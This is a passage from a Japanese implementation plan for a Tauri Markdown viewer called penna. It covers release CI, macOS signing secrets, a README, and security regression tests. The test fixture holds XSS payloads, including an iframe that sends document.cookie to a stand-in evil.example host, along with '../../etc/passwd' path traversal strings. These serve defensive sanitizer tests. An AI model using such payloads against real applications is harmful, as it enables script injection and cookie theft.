何をするか: ARM64 ネイティブランナーが使えない/コストを避けたい場合のクロスコンパイル手順を YAML 冒頭コメントで残す。なぜ必要か: `ubuntu-24.04-arm` ランナーが利用不可な環境への移植性を担保するため（AREA-SPECIFIC NOTES の「ARM Linux はクロスコンパイル or arm64 runners」要件）。どう書くか（`name: release` の直前にコメント追記）:

```yaml
# ARM64 Linux build strategy:
#   This workflow uses the native GitHub-hosted ARM runner `ubuntu-24.04-arm`.
#   Alternative (cross-compile on x86_64) if native ARM runners are unavailable:
#     - runs-on: ubuntu-22.04 with target aarch64-unknown-linux-gnu
#     - install: gcc-aarch64-linux-gnu and the arm64 webkit/gtk dev libs via
#       `dpkg --add-architecture arm64` + apt (sources must include arm64 ports)
#     - set CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER=aarch64-linux-gnu-gcc
#     - tauri-action arg: --target aarch64-unknown-linux-gnu
#   Native ARM runner is preferred: avoids fragile multiarch apt sources.
```

- [ ] **Step 10: ワークフローを検証する（GREEN）**

何をするか: `actionlint` で `release.yml` を検証する。なぜ必要か: matrix 参照・`needs` 連携・式構文の妥当性を機械的に確認するため（このタスクの合否判定）。どう書くか:

```bash
actionlint .github/workflows/release.yml
```

Run: `actionlint .github/workflows/release.yml`
Expected (PASS): 出力なし・終了コード 0（lint エラーが無ければ何も表示されない）

- [ ] **Step 11: 手動ドライランの手順を記録する（自動 E2E の代替）**

何をするか: 実際の Release を出さずにワークフローを試す手順を `docs/RELEASE.md` に記載する。なぜ必要か: 課金ビルドを伴うリリース CI は単体テスト化できないため、手動ドライラン手順を文書として固定する（spec §12 の「手動スモークを必須」に対応）。どう書くか:

```bash
cat > docs/RELEASE.md <<'EOF'
# Release 手順 / CI ドライラン

## 自動リリース（本番）
1. `vX.Y.Z` 形式のタグを push する（例: `git tag v0.1.0 && git push origin v0.1.0`）。
2. `.github/workflows/release.yml` が起動し、5 構成（macOS ARM64 / Windows x64 / Windows ARM64 / Linux x64 / Linux ARM64）をビルドする。
3. 全ビルド成功後、Draft Release が publish される。

## 手動ドライラン（成果物を本番 Release に出さない確認）
- `workflow_dispatch` で起動する: Actions タブ > release > Run workflow（main ブランチ）。
  - タグが無いため `nightly-<sha>` という Draft Release が作られる。確認後に手動で削除する。
- ローカル単体ビルド確認（CI を回さずバンドル生成だけ検証）:
  - macOS: `npm ci && npm run tauri build -- --target aarch64-apple-darwin`
  - 生成物は `src-tauri/target/aarch64-apple-darwin/release/bundle/` 配下に出る。
- YAML 検証: `actionlint .github/workflows/release.yml`（エラー無し・終了コード 0 を確認）。
EOF
```

Run: `actionlint .github/workflows/release.yml && test -f docs/RELEASE.md && echo OK`
Expected: `OK`

- [ ] **Step 12: コミットする**

```bash
git add .github/workflows/release.yml docs/RELEASE.md
git commit -m "ci: add cross-platform Tauri release build matrix"
```

Run: `git log --oneline -1`
Expected: `ci: add cross-platform Tauri release build matrix`

---

### Task 18: macOS Developer ID 署名 + notarization と必要シークレット文書化

このタスクは spec §11 の「macOS のみ署名・公証（確定）」を実装する。`tauri-action` 標準の署名 env パススルーを使い、macOS ジョブだけに Apple 署名/公証の環境変数を渡す。`tauri.conf.json` の macOS バンドル設定（`hardenedRuntime` / `entitlements` / `signingIdentity`）と entitlements ファイルを追加し、必要な GitHub Secrets を文書化する。Windows / Linux は v0.1 では未署名（spec §11）であることを明記する。

- [ ] **Step 1: entitlements.plist を追加する**

何をするか: hardened runtime 下で JIT/動的ライブラリ読込を許す最小 entitlements を定義する。なぜ必要か: 公証は hardened runtime を要求し、WKWebView（JavaScriptCore の JIT）動作のため `allow-jit` 等が必要になるため。どう書くか:

```xml
<!-- src-tauri/entitlements.plist -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>com.apple.security.cs.allow-jit</key>
  <true/>
  <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
  <true/>
  <key>com.apple.security.cs.disable-library-validation</key>
  <true/>
</dict>
</plist>
```

- [ ] **Step 2: `tauri.conf.json` の macOS バンドル設定を「失敗確認」してから追記する（RED）**

何をするか: 現状の `tauri.conf.json` に macOS 署名設定が無いことを確認する。なぜ必要か: TDD のレッド段階として、署名キーが未設定であることを明示するため。どう書くか:

```bash
node -e "const c=require('./src-tauri/tauri.conf.json'); process.exit(c.bundle?.macOS?.hardenedRuntime === true ? 0 : 1)"
```

Run: 上記コマンド
Expected (FAIL): 終了コード 1（`hardenedRuntime` がまだ無い）

- [ ] **Step 3: `tauri.conf.json` に macOS 署名/公証バンドル設定を追加する**

何をするか: `bundle.macOS` に `hardenedRuntime` / `entitlements` / `signingIdentity` を設定する。なぜ必要か: `tauri build` がコード署名と公証準備（hardened runtime + entitlements 焼き込み）を行うため。`signingIdentity` は env で上書きされるため `"-"` プレースホルダではなく `null` のままにし、CI の `APPLE_SIGNING_IDENTITY` を優先させる。どう書くか（`bundle` オブジェクト内に `macOS` を追記。既存の他キーは保持）:

```json
{
  "bundle": {
    "macOS": {
      "hardenedRuntime": true,
      "entitlements": "entitlements.plist",
      "signingIdentity": null,
      "minimumSystemVersion": "11.0"
    }
  }
}
```

注記: `signingIdentity: null` の場合、Tauri は環境変数 `APPLE_SIGNING_IDENTITY` を署名 ID として使う。`tauri.conf.json` 内に証明書名をハードコードしない（ローカル無署名ビルドを壊さないため）。`minimumSystemVersion` は spec の macOS ARM64（Apple Silicon, macOS 11+）に合わせる。

- [ ] **Step 4: macOS matrix エントリに署名/公証 env を追加する**

何をするか: Task 17 の `Build and upload Tauri bundles` ステップに、Apple 証明書・公証用の env を渡す。なぜ必要か: `tauri-action`/`tauri build` は env 経由で証明書 import と公証認証を行うため（証明書系は全 OS に書いても macOS 以外では空で無害）。app-specific password と App Store Connect API キーの両対応を載せ、API キーがあればそちらを優先する設計とする。どう書くか（`env:` ブロックを拡張）:

```yaml
      - name: Build and upload Tauri bundles
        uses: tauri-apps/tauri-action@v0
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # macOS code signing (Developer ID). Empty on non-macOS runners.
          APPLE_CERTIFICATE: ${{ secrets.APPLE_CERTIFICATE }}
          APPLE_CERTIFICATE_PASSWORD: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}
          APPLE_SIGNING_IDENTITY: ${{ secrets.APPLE_SIGNING_IDENTITY }}
          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
          # Notarization via App Store Connect API key (preferred).
          APPLE_API_KEY: ${{ secrets.APPLE_API_KEY }}
          APPLE_API_ISSUER: ${{ secrets.APPLE_API_ISSUER }}
          APPLE_API_KEY_PATH: ${{ secrets.APPLE_API_KEY_PATH }}
          # Notarization fallback via Apple ID + app-specific password.
          APPLE_ID: ${{ secrets.APPLE_ID }}
          APPLE_PASSWORD: ${{ secrets.APPLE_PASSWORD }}
        with:
          releaseId: ${{ needs.create-release.outputs.release_id }}
          args: ${{ matrix.args }}
```

注記: Windows / Linux のジョブには署名 env を渡しても効果が無く、空文字なので署名処理はスキップされる。Tauri は `APPLE_CERTIFICATE`（base64 の .p12）と `APPLE_CERTIFICATE_PASSWORD` が揃った時のみ macOS で署名を行う。

- [ ] **Step 5: 必要 GitHub Secrets と未署名プラットフォームの注意を文書化する**

何をするか: 署名/公証に要するシークレット一覧と、Windows/Linux 未署名（v0.1）の方針を `docs/RELEASE.md` に追記する。なぜ必要か: シークレット未設定だと macOS 公証が無音で失敗 or 未公証バンドルが出るため、運用手順を固定する（spec §14「macOS 公証の CI 化」リスク対応）。どう書くか:

```bash
cat >> docs/RELEASE.md <<'EOF'

## macOS コード署名 / 公証（v0.1 で署名するのは macOS のみ）

Settings > Secrets and variables > Actions に以下を登録する。

### コード署名（Developer ID Application 証明書）
| Secret | 内容 | 取得元 |
|--------|------|--------|
| `APPLE_CERTIFICATE` | Developer ID Application の `.p12` を base64 化した文字列（`base64 -i cert.p12 | pbcopy`） | Apple Developer / Keychain 書き出し |
| `APPLE_CERTIFICATE_PASSWORD` | 上記 `.p12` の書き出しパスワード | 書き出し時に自分で設定 |
| `APPLE_SIGNING_IDENTITY` | 署名 ID（例 `Developer ID Application: Your Name (TEAMID)`） | `security find-identity -v -p codesigning` |
| `APPLE_TEAM_ID` | 10 桁の Team ID | Apple Developer アカウント |

### 公証（どちらか一方の方式を採用）
方式 A: App Store Connect API キー（推奨・期限切れに強い）
| Secret | 内容 |
|--------|------|
| `APPLE_API_KEY` | API キー ID（`AuthKey_XXXX.p8` の `XXXX`） |
| `APPLE_API_ISSUER` | Issuer ID（UUID） |
| `APPLE_API_KEY_PATH` | ランナー上の `.p8` パス（事前に書き出すステップが別途必要） |

方式 B: Apple ID + app-specific password（簡易）
| Secret | 内容 |
|--------|------|
| `APPLE_ID` | Apple ID メールアドレス |
| `APPLE_PASSWORD` | app-specific password（appleid.apple.com で発行） |

方式 A を使う場合、`.p8` をランナーに書き出すステップを macOS ジョブに追加する想定:
```
- name: Write App Store Connect API key
  if: matrix.platform == 'macos-14'
  run: |
    mkdir -p ~/.appstoreconnect/private_keys
    echo "${{ secrets.APPLE_API_KEY_CONTENT }}" | base64 --decode > ~/.appstoreconnect/private_keys/AuthKey_${{ secrets.APPLE_API_KEY }}.p8
```
（この場合 `APPLE_API_KEY_PATH` は不要で Tauri が既定パスを探索する。プロジェクトの運用に合わせ A か B のどちらかに統一すること。）

## Windows / Linux は v0.1 では未署名
- spec §11 の確定事項により、v0.1 で署名・公証するのは **macOS のみ**。
- Windows: SmartScreen 警告が出る。Release ノートに「詳細 > 実行」での起動手順を明記する。
- Linux: AppImage/deb は未署名。Windows コード署名は将来ロードマップ（spec §15）。

## 公証の手動ドライラン確認
- ローカルで Developer ID 署名ビルドし、公証を確認する:
  - `xcrun notarytool submit <app>.dmg --apple-id "$APPLE_ID" --password "$APPLE_PASSWORD" --team-id "$APPLE_TEAM_ID" --wait`
  - 成功後 `xcrun stapler staple <app>.dmg` で staple できることを確認する。
- 署名検証: `codesign --verify --deep --strict --verbose=2 <app>.app`（`valid on disk` 表示を確認）。
EOF
```

- [ ] **Step 6: 設定を検証する（GREEN）**

何をするか: `tauri.conf.json` の JSON 妥当性・`hardenedRuntime` 設定・entitlements ファイル存在、そして `release.yml` の YAML を一括検証する。なぜ必要か: 署名設定はビルド時まで効果が分かりにくいため、構文・キー・参照ファイルの存在を push 前に機械確認する。どう書くか:

```bash
node -e "const c=require('./src-tauri/tauri.conf.json'); if(c.bundle.macOS.hardenedRuntime!==true) process.exit(1); if(c.bundle.macOS.entitlements!=='entitlements.plist') process.exit(1)" \
  && test -f src-tauri/entitlements.plist \
  && plutil -lint src-tauri/entitlements.plist \
  && actionlint .github/workflows/release.yml \
  && echo OK
```

Run: 上記コマンド
Expected (PASS): `src-tauri/entitlements.plist: OK` に続けて `OK`（全検証が通り終了コード 0）

- [ ] **Step 7: コミットする**

```bash
git add src-tauri/tauri.conf.json src-tauri/entitlements.plist .github/workflows/release.yml docs/RELEASE.md
git commit -m "ci: add macOS Developer ID signing and notarization"
```

Run: `git log --oneline -1`
Expected: `ci: add macOS Developer ID signing and notarization`

### Task 19: セキュリティ統合テスト・手動スモークチェックリスト・E2E スケルトン

このタスクの目的は、悪意ある Markdown が描画パイプライン（`renderDocument` + `sanitize`）を通っても、実行可能なスクリプト・イベントハンドラ・情報漏えい経路が残らないことを文字列レベルで保証することと、`resolveImageSrc` がパストラバーサル文字列でも必ず `convertFileSrc` 経由（=capabilities の asset scope で制限される経路）になることを保証することである。あわせて自動化しない手動スモーク手順を文書化し、E2E は任意のストレッチとしてスケルトンだけ用意する。

**前提（このタスクは Tasks 9/10/11 完了後に実行する）**: 本タスクのセキュリティテストは `renderDocument`（Task 9）/ `sanitize`（Task 10）/ `resolveImageSrc`・`classifyLink`（Task 11）が実装済みであることを前提とする回帰テストである。よって実行時の Expected は **PASS で確定**（条件付きの RED/GREEN ではない）。

全体の流れ:
1. セキュリティ統合テスト（XSS 無害化）の回帰テストを作成する。
2. `resolveImageSrc` のスコープ回帰テストを同ファイルに追記する。
3. テストを実行して PASS を確認する（前提 Tasks 完了後に実行）。
4. 手動スモークチェックリストを追加する。
5. E2E スケルトンを任意ストレッチとして追加する。
6. まとめてコミットする。

前提: `convertFileSrc` は `@tauri-apps/api/core` のモック対象とする。`renderDocument` / `sanitize` / `resolveImageSrc` / `classifyLink` は Tasks 9/10/11 で実装済みである。テストランナーは vitest + jsdom（`vite.config.ts` の `environment: "jsdom"` 設定は基盤エリアで済んでいる前提）。

- [ ] **Step 1: セキュリティ統合テスト（XSS 無害化）の回帰テストを作成する**

`src/__tests__/security.test.ts` を新規作成する。なぜ必要か: 悪意ある Markdown が描画後に実行可能要素を残さないことを回帰テストとして固定するため（Tasks 9/10/11 完了後に実行する前提のため PASS を期待する）。どう書くか: 既知の攻撃ペイロード（`<script>`、`onerror` 付き `<img>`、`javascript:` リンク、`<iframe>` による情報持ち出し）を 1 つの Markdown 文字列にまとめ、`renderDocument` の出力に対して contains / not-contains を断言する。`@tauri-apps/api/core` の `convertFileSrc` はモックする（jsdom には Tauri ランタイムが無いため）。

```ts
// src/__tests__/security.test.ts
import { describe, it, expect, vi } from "vitest";

// Tauri ランタイムは jsdom に存在しないため core をモックする。
// convertFileSrc は「asset スコープに通す」という事実だけ検証したいので、
// 入力パスが分かる形のダミー文字列を返す。
vi.mock("@tauri-apps/api/core", () => ({
  convertFileSrc: (path: string) => `asset://localhost/${encodeURIComponent(path)}`,
}));

import { renderDocument } from "../markdown/renderer";
import { sanitize } from "../markdown/sanitize";
import { resolveImageSrc } from "../markdown/links";
import type { LoadedFile } from "../types";

// 1 つの Markdown に代表的な XSS ベクタを詰め込む。
const MALICIOUS_MARKDOWN = [
  "# Hello",
  "",
  "<script>window.__pwned = true; alert('xss')</script>",
  "",
  "<img src=x onerror=\"window.__pwned = true\">",
  "",
  "[click me](javascript:alert(document.cookie))",
  "",
  "<iframe src=\"https://evil.example/steal?c=document.cookie\"></iframe>",
  "",
  "<a href=\"https://ok.example\" onclick=\"steal()\">link</a>",
  "",
  "<svg><script>alert(1)</script></svg>",
  "",
  "<style>body{display:none}</style>",
].join("\n");

function mdFile(text: string): LoadedFile {
  return { path: "/docs/evil.md", text, encoding: "UTF-8", kind: "Markdown" };
}

describe("security: malicious markdown is neutralized", () => {
  const html = renderDocument(mdFile(MALICIOUS_MARKDOWN), "/docs");

  it("contains no executable <script> tag", () => {
    expect(html.toLowerCase()).not.toContain("<script");
  });

  it("strips inline event handlers (onerror/onclick)", () => {
    expect(html.toLowerCase()).not.toContain("onerror");
    expect(html.toLowerCase()).not.toContain("onclick");
  });

  it("removes javascript: URLs", () => {
    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("removes data-exfil iframe", () => {
    expect(html.toLowerCase()).not.toContain("<iframe");
  });

  it("removes <style> blocks", () => {
    expect(html.toLowerCase()).not.toContain("<style");
  });

  it("still renders the benign heading text", () => {
    expect(html).toContain("Hello");
  });

  it("running sanitize again is idempotent (no script reappears)", () => {
    const twice = sanitize(html);
    expect(twice.toLowerCase()).not.toContain("<script");
    expect(twice.toLowerCase()).not.toContain("javascript:");
  });
});
```

- [ ] **Step 2: XSS 無害化テストを実行して PASS を確認する（回帰ゲート）**

なぜ必要か: 前提（Tasks 9/10/11 完了後に実行）が満たされているため、これは「悪意ある Markdown が無害化される」ことを固定する回帰ゲートであり、Expected は PASS で確定する。

```
Run: npm run test -- src/__tests__/security.test.ts
Expected: PASS（XSS 無害化系のすべての it が緑）
```

補足（任意・記録用）: もし RED-first を踏みたい場合は、本テストを先に追加した時点で `renderDocument`/`sanitize` が未実装なら import 解決に失敗して FAIL するが、本タスクは前提 Tasks 完了後に実行するため、実行時の Expected は PASS とする。

- [ ] **Step 3: resolveImageSrc のパストラバーサル・スコープテストを追記する**

`src/__tests__/security.test.ts` の末尾に追記する。なぜ必要か: `resolveImageSrc` が `../../etc/passwd` のような脱出を試みる相対パスでも、独自に絶対パスを生成して `fs` を直叩きするのではなく、必ず `convertFileSrc`（= Tauri asset protocol、capabilities の asset scope で物理的に制限される経路）に通すことを保証するため。どう書くか: http(s) / data はそのまま、相対・トラバーサルは `asset://`（モックの戻り値プレフィックス）になることを断言する。

```ts
// src/__tests__/security.test.ts （末尾に追記）
describe("security: resolveImageSrc keeps every local path inside the asset protocol", () => {
  const baseDir = "/docs";

  it("passes through http(s) URLs unchanged", () => {
    expect(resolveImageSrc("https://cdn.example/a.png", baseDir)).toBe(
      "https://cdn.example/a.png",
    );
    expect(resolveImageSrc("http://cdn.example/a.png", baseDir)).toBe(
      "http://cdn.example/a.png",
    );
  });

  it("passes through data: URIs unchanged", () => {
    const dataUri = "data:image/png;base64,iVBORw0KGgo=";
    expect(resolveImageSrc(dataUri, baseDir)).toBe(dataUri);
  });

  it("routes a plain relative path through convertFileSrc (asset://)", () => {
    const out = resolveImageSrc("img/logo.png", baseDir);
    expect(out.startsWith("asset://localhost/")).toBe(true);
    // 物理ファイルパスを生で露出していないこと（asset プロトコルに包まれていること）
    expect(out.startsWith("/")).toBe(false);
    expect(out.startsWith("file:")).toBe(false);
  });

  it("a traversal path (../../etc/passwd) is STILL only routed through convertFileSrc", () => {
    const out = resolveImageSrc("../../etc/passwd", baseDir);
    // フロントは自前で fs を叩かない。脱出文字列でも convertFileSrc に渡るだけ。
    // 実際のアクセス可否は capabilities の asset scope（src-tauri 側）が決定する。
    expect(out.startsWith("asset://localhost/")).toBe(true);
    expect(out).not.toContain("file://");
  });

  it("does not fabricate an absolute filesystem URL for traversal", () => {
    const out = resolveImageSrc("../../../../../../etc/passwd", baseDir);
    expect(out.startsWith("asset://localhost/")).toBe(true);
  });
});
```

注記（テスト内コメントで明示済み）: フロントエンド単体では「スコープ外への物理アクセスを遮断する」ことは検証できない。遮断の実体は `src-tauri` の capabilities における asset protocol scope（開いたファイルのディレクトリに限定）であり、これは基盤/コマンドエリアの Tauri 設定タスクが担保する。本テストは「フロントが生 `fs` を叩かず、必ず `convertFileSrc` 経由にする」という前段の不変条件のみを固定する。

- [ ] **Step 4: テストを実行して PASS を確認する**

なぜ必要か: 実装（renderer/sanitize/links は他エリア済み）と組み合わせて、セキュリティ不変条件が成立していることを確認するため。

```
Run: npm run test -- src/__tests__/security.test.ts
Expected: PASS
  Test Files  1 passed (1)
       Tests  12 passed (12)
```

- [ ] **Step 5: 手動スモークチェックリストを追加する**

`docs/smoke-checklist.md` を新規作成する。なぜ必要か: E2E を MVP 必須にしないため、リリース前に人手で確認すべき経路を抜け漏れなく定義するため。どう書くか: 設計仕様の「開く経路」「機能セット」に沿ったチェック項目を OS 別の前提とともに列挙する。

```markdown
# penna 手動スモークチェックリスト（v0.1）

リリース候補ビルドに対して、各対象 OS（macOS ARM64 / Windows x86_64・ARM64 / Linux x86_64・ARM64）で以下を確認する。E2E は任意ストレッチのため、本チェックは v0.1 で必須とする。

## 起動・ファイルを開く

- [ ] CLI: `penna README.md` を実行するとウィンドウが 1 枚開き、Markdown が描画される
- [ ] CLI: 存在しないパスを渡すとエラーがバナー等で graceful に表示され、クラッシュしない
- [ ] Finder/Explorer: `.md` ファイルをダブルクリックすると penna が起動し描画される
- [ ] ドラッグ&ドロップ: 開いているウィンドウへ `.md` をドロップすると新規ウィンドウで開く
- [ ] メニュー: File > Open でネイティブダイアログから開ける
- [ ] 引数なし起動: 空ウィンドウ＋ドロップゾーン（「開く」ボタン）が表示される
- [ ] 単一インスタンス: penna 起動中に `penna other.md` を再実行しても 1 プロセスに集約され、新規ウィンドウが開く

## 描画

- [ ] Markdown: 見出し・表（GFM）・タスクリスト・打消し線・自動リンク・脚注が正しく描画される
- [ ] コードブロックがある文書を開くと highlight.js が遅延ロードされハイライトされる
- [ ] コードブロックが無い文書では highlight.js が読み込まれない（起動・描画が速い）
- [ ] プレーンテキスト（`.txt` 等）: 等幅・ソフトラップ・空白/改行保持で表示される
- [ ] ローカル相対画像が表示される（asset protocol 経由）
- [ ] リモート画像（http/https）が表示される
- [ ] エンコーディング: Shift-JIS / EUC-JP / UTF-16(BOM) の日本語 `.txt` が文字化けせず表示され、判定結果がウィンドウ内に表示される

## 操作

- [ ] テーマ: 設定で system/light/dark を切り替えると即時反映され、OS テーマ追従も機能する
- [ ] 検索: Cmd/Ctrl+F で検索バーが開き、一致件数表示・次/前移動が機能する
- [ ] ズーム: Cmd/Ctrl +/-/0 で本文サイズが拡大縮小・リセットされる
- [ ] 外部リンク: http(s) リンクをクリックすると OS 既定ブラウザで開き、webview 自体は遷移しない
- [ ] ローカル相対リンク（`.md`）: クリックすると新規 penna ウィンドウで開く
- [ ] アンカーリンク: 文書内スクロールする

## 自動リロード / ファイル監視

- [ ] 別エディタで開いている `.md` を保存すると、約 150ms のデバウンス後に内容が自動更新される
- [ ] 自動リロードを設定で OFF にすると、保存しても更新されない
- [ ] 監視中ファイルを削除/リネームすると `file-removed` によりバナー表示され、クラッシュしない

## セキュリティ

- [ ] スクリプトや `onerror` 等を含む Markdown を開いても、スクリプトが実行されない（DOMPurify で無害化）
- [ ] `javascript:` リンクをクリックしても何も実行されない
```

- [ ] **Step 6: E2E スケルトンを任意ストレッチとして追加する（WebdriverIO 設定）**

`e2e/wdio.conf.ts` を新規作成する。なぜ必要か: 設計仕様で E2E は v0.1 任意ストレッチと定義されており、将来常時化するための足場だけ用意するため。どう書くか: tauri-driver + WebdriverIO の最小構成。CI 必須にはしないことをコメントで明記する。

```ts
// e2e/wdio.conf.ts
// OPTIONAL stretch (v0.1 では CI 必須ではない / 手動スモークが必須)。
// 実行には tauri-driver と各 OS の WebDriver（macOS は未対応のため Linux/Windows のみ）が必要。
// Run (stretch): npx tauri build --debug && npx tauri-driver & npx wdio run e2e/wdio.conf.ts
import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import path from "node:path";

let tauriDriver: ChildProcess | undefined;

const appBinary = path.resolve(
  __dirname,
  "..",
  "src-tauri",
  "target",
  "debug",
  process.platform === "win32" ? "penna.exe" : "penna",
);

export const config: WebdriverIO.Config = {
  runner: "local",
  specs: ["./specs/**/*.e2e.ts"],
  maxInstances: 1,
  capabilities: [
    {
      // tauri-driver が解釈する独自 capability。
      "tauri:options": { application: appBinary },
    } as WebdriverIO.Capabilities,
  ],
  logLevel: "info",
  framework: "mocha",
  mochaOpts: { ui: "bdd", timeout: 60000 },
  // tauri-driver をテスト前後に起動・停止する。
  onPrepare: () => {
    spawnSync("cargo", ["build"], { cwd: path.resolve(__dirname, "..", "src-tauri") });
  },
  beforeSession: () => {
    tauriDriver = spawn("tauri-driver", [], { stdio: [null, process.stdout, process.stderr] });
  },
  afterSession: () => {
    tauriDriver?.kill();
  },
};
```

- [ ] **Step 7: E2E スモークスペックのスケルトンを追加する**

`e2e/specs/open-render.e2e.ts` を新規作成する。なぜ必要か: 「開く→描画」「テーマ切替」「検索」の代表 3 シナリオの足場を示すため。どう書くか: 失敗させず将来のために `it.skip` でスケルトン化し、ストレッチであることを明示する。

```ts
// e2e/specs/open-render.e2e.ts
// OPTIONAL stretch スモーク。v0.1 では skip。tauri-driver 環境が整い次第 .skip を外す。
describe("penna smoke (stretch)", () => {
  it.skip("opens a markdown file and renders the heading", async () => {
    // 起動引数 or window_path 経由で開いた文書の本文が描画されることを確認する。
    const body = await $("#content");
    await expect(body).toHaveTextContaining("Hello");
  });

  it.skip("toggles theme to dark via the settings panel control", async () => {
    const root = await $("html");
    // 設定パネルの theme コントロール（settingsPanel.ts の data-field="theme"）を駆動する。
    const themeSelect = await $('#settings [data-field="theme"]');
    await themeSelect.selectByAttribute("value", "dark");
    // ネイティブの change が発火しない環境向けに明示的に dispatch する。
    await browser.execute(() => {
      const el = document.querySelector('#settings [data-field="theme"]') as HTMLSelectElement;
      el.value = "dark";
      el.dispatchEvent(new Event("change"));
    });
    await expect(root).toHaveAttribute("data-theme", "dark");
  });

  it.skip("opens the find bar with Cmd/Ctrl+F", async () => {
    await browser.keys(process.platform === "darwin" ? ["Meta", "f"] : ["Control", "f"]);
    const findBar = await $("#findbar");
    await expect(findBar).toBeDisplayed();
  });
});
```

- [ ] **Step 8: セキュリティテスト一式が PASS し、E2E がスモークから除外されることを確認してコミットする**

なぜ必要か: 追加したファイルが既存テストスイートを壊さず、E2E スケルトンは vitest 対象外（`vite.config.ts` の include は `tests/**` と `src/**` のみで `e2e/**` を拾わない）であることを確認するため。

```
Run: npm run test
Expected: PASS（security.test.ts を含む全テストが緑。e2e/ 配下は vitest の include 外で実行されない）
Run: git add src/__tests__/security.test.ts docs/smoke-checklist.md e2e/wdio.conf.ts e2e/specs/open-render.e2e.ts
Run: git commit -m "test: add XSS/asset-scope security tests, smoke checklist, and optional E2E skeleton"
Expected: 1 commit created.
```

### Task 20: README と v0.1 スコープ（CHANGELOG）の整備

このタスクの目的は、penna が何であるか・対応プラットフォーム・開発/ビルド手順・各 OS のインストール時注意（未署名 Windows/Linux の初回起動手順、署名済み macOS の扱い）を README にまとめ、v0.1 のスコープを CHANGELOG として固定することである。

全体の流れ:
1. README を新規作成する（日本語の散文、コマンドは英語）。
2. CHANGELOG（v0.1 スコープ）を新規作成する。
3. README から CHANGELOG・設計仕様・スモークチェックリストへの相互リンクを確認する。
4. まとめてコミットする。

前提: ライセンスは MIT（`LICENSE` 既存、Copyright (c) 2026 btajp）。配布は GitHub Releases。

- [ ] **Step 1: README.md を新規作成する**

`README.md` を新規作成する。なぜ必要か: 利用者・開発者の最初の入口として、用途・対応 OS・開発/ビルド手順・インストール時注意を 1 か所に集約するため。どう書くか: 設計仕様 §1–§4・§11 に沿い、散文は日本語、コマンドは英語で記述する。未署名 OS の初回起動手順と macOS の署名状況を明記する。

```markdown
# penna

penna は、プレーンテキストと Markdown を**閲覧するための軽量・シンプルなクロスプラットフォーム ビューワー**です。編集機能は持たず（読み取り専用）、OS 標準のプレビューアのように「ファイルを素早く開いて、きれいに読む」ことだけに集中します。最優先の設計方針は**起動と動作の軽さ**です。

Tauri v2（Rust バックエンド + OS 標準 WebView）で実装しており、小さなバイナリと省メモリを実現します。

## 主な機能（v0.1）

- Markdown 描画: CommonMark + GFM（表・タスクリスト・打消し線・自動リンク）+ 脚注
- コードブロックのシンタックスハイライト（highlight.js を遅延ロード。コードが無い文書では読み込まない）
- プレーンテキスト描画（等幅・ソフトラップ・空白/改行保持）
- 文字エンコーディング自動判定（UTF-8 / UTF-16(BOM) / Shift-JIS / EUC-JP）
- テーマ: OS 追従（ライト/ダーク）＋手動トグル
- ドキュメント内検索（Cmd/Ctrl+F）
- フォント拡大縮小（Cmd/Ctrl +/-/0）
- 外部変更の自動リロード（別エディタで保存すると即反映。既定 ON）
- ファイルを開く導線: CLI 引数 / Finder・Explorer ダブルクリック / ドラッグ&ドロップ / メニューの File > Open
- 設定画面（テーマ / セッション復元 / 自動リロード / フォント / 既定エンコーディング）

ウィンドウモデルは「1 ファイル＝1 ウィンドウ」です（タブは持ちません）。

## 対応プラットフォーム

| OS | アーキテクチャ | WebView |
|----|----------------|---------|
| Linux | x86_64 / ARM64 | WebKitGTK |
| Windows | x86_64 / ARM64 | WebView2 |
| macOS | ARM64（Apple Silicon）のみ | WKWebView |

macOS は Apple Silicon のみ対応です（Intel Mac はサポート外）。

## 開発

前提ツール: Node.js（LTS）、Rust（stable）、各 OS の Tauri 前提パッケージ（Linux は WebKitGTK 関連の dev パッケージ等。詳細は Tauri v2 の公式前提条件を参照）。

```bash
# 依存をインストール
npm install

# 開発モードで起動（フロントの HMR + Rust の再ビルド）
npm run tauri dev
```

### テスト

```bash
# フロントエンド単体テスト（vitest + jsdom）
npm run test

# Rust 単体テスト
cargo test --manifest-path src-tauri/Cargo.toml
```

E2E（tauri-driver + WebdriverIO）は v0.1 では任意ストレッチです（CI 必須ではありません）。スケルトンは `e2e/` にあります。リリース前の必須確認は [手動スモークチェックリスト](docs/smoke-checklist.md) で行います。

## ビルド

```bash
# 現在の OS 向けインストーラ/バンドルを生成
npm run tauri build
```

生成物は `src-tauri/target/release/bundle/` 配下に出力されます。各 OS インストーラは GitHub Actions のマトリクスビルドでも生成し、[GitHub Releases](https://github.com/btajp/penna/releases) で配布します。

- macOS: `.dmg` / `.app`（ARM64）
- Windows: `.msi` または NSIS（x86_64 / ARM64）
- Linux: `.AppImage` ＋ `.deb`（x86_64 / ARM64）

## インストールと初回起動の注意

### macOS（署名・公証済み）

macOS 版は Developer ID で署名し notarization 済みです。通常どおり `.dmg` からアプリケーションへドラッグしてください。Gatekeeper の追加操作は不要です。

### Windows（v0.1 は未署名）

Windows 版は v0.1 ではコード署名していません。インストーラ初回実行時に SmartScreen の警告が出ることがあります。続行するには次の手順を取ってください。

1. 警告ダイアログの「詳細情報」をクリックする
2. 表示された「実行」ボタンをクリックする

配布元（GitHub Releases の公式ページ）から取得したファイルであることを確認してから実行してください。

### Linux（v0.1 は未署名）

Linux 版も未署名です。`.AppImage` は実行権限を付与してから起動します。

```bash
chmod +x penna_0.1.0_amd64.AppImage
./penna_0.1.0_amd64.AppImage
```

`.deb` は次のようにインストールします。

```bash
sudo dpkg -i penna_0.1.0_amd64.deb
```

ディストリビューションによっては WebKitGTK のバージョン差で描画に差が出ることがあります。テキスト/Markdown 中心のため影響は限定的ですが、表示に問題があれば Issue で報告してください。

## ファイル関連付け

既定で関連付ける Markdown 拡張子: `.md` `.markdown` `.mdown` `.mkd` `.mkdn` `.mdwn`。

`.txt` の関連付けは、全テキストファイルの既定アプリを奪わないため**既定では行いません**（インストール時のオプトイン）。

## セキュリティ

